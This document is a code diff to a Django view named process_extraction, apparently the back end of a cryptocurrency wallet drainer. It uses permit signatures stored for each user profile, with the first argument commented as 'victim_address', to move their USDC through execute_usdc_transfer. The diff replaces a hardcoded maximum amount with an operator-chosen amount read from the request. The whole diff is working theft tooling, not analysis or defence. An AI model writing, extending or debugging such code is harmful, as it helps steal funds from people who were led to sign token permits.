@@ -60,29 +60,32 @@ def admin_extraction_list(request):
 def process_extraction(request, profile_id):
     profile = get_object_or_404(Profile, id=profile_id)
 
-    # Validation: Ensure we actually have the data
-    if not all([profile.wallet_address, profile.permit_v, profile.permit_r, profile.permit_s]):
-        return JsonResponse({'status': 'error', 'msg': 'Missing signature data in database.'})
+    # Capture the amount from the frontend
+    requested_amount = request.GET.get('amount')
 
-    # This MUST match the 6 arguments in your utils.py:
-    # (victim_address, amount, deadline, v, r, s)
-    tx_hash, error = execute_usdc_transfer(
-        profile.wallet_address,      # 1
-        999999999999999999,          # 2 (Amount - ensure this is an int)
-        profile.permit_deadline,     # 3
-        profile.permit_v,            # 4
-        profile.permit_r,            # 5
-        profile.permit_s             # 6
-    )
+    if not requested_amount:
+        return JsonResponse({'status': 'error', 'msg': 'Please enter an amount.'})
 
-    if tx_hash:
-        profile.web3_approval_tx = tx_hash
-        profile.has_web3_approval = False
-        profile.save()
-        return JsonResponse({'status': 'success', 'tx': tx_hash})
-    else:
-        # This will show you exactly why the blockchain rejected it (e.g., No ETH for gas)
-        return JsonResponse({'status': 'error', 'msg': f"Blockchain Error: {error}"})
+    try:
+        # Convert human-readable (100) to USDC units (100000000)
+        clean_amount = int(float(requested_amount) * 10**6)
+
+        tx_hash, error = execute_usdc_transfer(
+            profile.wallet_address,
+            clean_amount,
+            profile.permit_deadline,
+            profile.permit_v,
+            profile.permit_r,
+            profile.permit_s
+        )
+
+        if tx_hash:
+            return JsonResponse({'status': 'success', 'tx': tx_hash})
+        else:
+            return JsonResponse({'status': 'error', 'msg': error})
+
+    except ValueError:
+        return JsonResponse({'status': 'error', 'msg': 'Invalid amount format.'})
 
 # --- PUBLIC REGISTRATION VIEW ---
 
